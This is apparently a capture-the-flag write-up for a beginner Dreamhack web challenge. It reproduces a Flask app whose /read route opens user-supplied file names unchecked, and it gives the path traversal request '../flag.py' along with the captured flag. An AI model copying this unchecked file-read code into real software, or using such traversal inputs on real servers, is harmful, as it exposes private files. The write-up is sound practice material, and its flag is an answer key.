---
title: file download 1
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, Path traversal]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/37/](https://dreamhack.io/wargame/challenges/37/)

## Description
>
> A Web service in which a File Download vulnerability exists.
>
> When you download the ```flag.py```, you can earn the flag.

### Attached

```python
#!/usr/bin/env python3
import os
import shutil

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)

UPLOAD_DIR = 'uploads'


@APP.route('/')
def index():
    files = os.listdir(UPLOAD_DIR)
    return render_template('index.html', files=files)


@APP.route('/upload', methods=['GET', 'POST'])
def upload_memo():
    if request.method == 'POST':
        filename = request.form.get('filename')
        content = request.form.get('content').encode('utf-8')

        if filename.find('..') != -1:
            return render_template('upload_result.html', data='bad characters,,')

        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f:
            f.write(content)

        return redirect('/')

    return render_template('upload.html')


@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '')

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)


if __name__ == '__main__':
    if os.path.exists(UPLOAD_DIR):
        shutil.rmtree(UPLOAD_DIR)

    os.mkdir(UPLOAD_DIR)

    APP.run(host='0.0.0.0', port=8000)

```

## Analyzation

Check the ```read_memo()``` function

```python
@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '')

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)
```

It does not check the validate of the filename!

The ```flag.py``` file is at same directory with ```app.py``` file. The above query goes to sub-directory ```UPLOAD_DIR```, so we need to travel backward.

## Solution

```
./read?name=../flag.py
```

The flag is
```
DH{uploading_webshell_in_python_program_is_my_dream}
```

## Summarization

[Path traversal](https://owasp.org/www-community/attacks/Path_Traversal)
